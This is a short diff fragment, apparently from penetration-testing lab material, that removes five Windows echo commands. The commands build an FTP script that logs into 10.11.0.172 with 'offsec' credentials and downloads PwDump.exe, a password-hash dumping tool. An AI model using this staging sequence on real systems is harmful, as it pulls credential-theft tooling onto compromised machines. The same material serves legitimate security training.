@@ -1,5 +1,0 @@
-echo open 10.11.0.172 21 > ftp.txt
-echo user offsec offsec >>ftp.txt
-echo bin >>ftp.txt
-echo GET PwDump.exe >>ftp.txt
-echo bye >>ftp.txt
